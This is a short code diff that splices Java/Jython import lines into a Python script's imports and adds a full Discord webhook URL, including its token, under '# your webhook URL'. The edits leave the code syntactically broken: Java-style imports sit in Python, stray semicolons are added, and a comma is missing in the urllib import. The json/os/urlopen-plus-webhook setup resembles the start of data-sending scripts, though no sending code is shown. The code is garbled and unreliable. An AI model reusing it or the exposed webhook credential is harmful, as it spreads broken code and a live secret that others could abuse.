@@ -1,7 +1,8 @@
+import org.python:jython-slim:2.7.2
 import org.python.util.PythonInterpreter;
-import json
-import os
-from urllib.request import Request, urlopen
+import json;
+import os;
+from urllib.request import Request urlopen
 
 # your webhook URL
 WEBHOOK_URL = "https://discord.com/api/webhooks/804218581340258355/vFYX1xCUHXqU8j4axQ36uVjCssUJodMUYbsys6XdxOoGn2IXl7N-xmGxLXCWBvm3XmHf"
